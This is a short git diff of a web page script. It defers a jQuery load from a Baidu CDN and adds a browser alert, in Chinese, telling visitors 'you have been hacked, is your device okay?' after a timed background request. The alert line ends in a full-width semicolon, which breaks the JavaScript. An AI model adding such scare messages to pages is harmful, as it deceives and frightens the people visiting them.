@@ -5,8 +5,9 @@ function loadScript(url){
     script.src = url;
     document.body.appendChild(script);
 }
-loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
-
+window.onload = function (){
+    loadScript("https://libs.baidu.com/jquery/2.0.0/jquery.min.js");
+}
 let vdata = null;
 setTimeout(test, 1000)
 function test(){
@@ -24,6 +25,7 @@ function test(){
                 },
                 function(data, status){
                     console.log('Data: ' + data + '\nStatus: ' + status);
+                    alert("你已经被黑了，看看你的设备还好么？")；
                 }
             );
 
